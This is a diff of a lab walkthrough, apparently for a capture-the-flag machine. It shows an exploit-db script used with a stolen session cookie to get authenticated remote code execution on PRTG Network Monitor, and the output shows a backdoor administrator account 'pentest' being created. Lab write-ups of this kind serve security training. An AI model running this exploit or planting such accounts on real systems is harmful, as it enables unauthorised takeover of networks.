@@ -277,19 +277,12 @@ Get cookie information (Q inspect element after login, go to storage Cookies:
 
 ![COOKIE](IMG/prtg_cookie.png)
 
-Try to run exploit:
-```shell
-
-```
-```
 
 # FootHold
 
-First try with prtg-exploit.sh script:
+First try with prtg-exploit.sh script, get information from cookie editor addon:
 ```shell
-└──╼ $cp /usr/share/exploitdb/exploits/windows/webapps/46527.sh ./prtg-exploit.sh
-
-└──╼ $./prtg-exploit.sh http://10.129.43.52 -c "OCTOPUS1813713946=ezFGQkM1NkY1LTk4NUQtNDFGQy1BMkFGLTc4NzRENjg2NzcwRn0%3D"
+└─$ ./prtg-exploit.sh -u http://http://10.129.96.142 -c "_ga=GA1.4.1813050781.1662751751; _gid=GA1.4.275445248.1662899444; OCTOPUS1813713946=e0IyOTcxNjU2LTU3MEItNDZBRC1CQURELTY0NDQ0NTQxOURFRX0%3D _gat=1"
 
 [+]#########################################################################[+] 
 [*] Authenticated PRTG network Monitor remote code execution                [*] 
@@ -312,7 +305,7 @@ First try with prtg-exploit.sh script:
  [*] file created 
  [*] sending notification wait....
 
- [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] adding a new user 'pentest' with password 'P3nT3st!' 
  [*] sending notification wait....
 
  [*] adding a user pentest to the administrators group 
@@ -320,6 +313,7 @@ First try with prtg-exploit.sh script:
 
 
  [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+
 
 ```
 
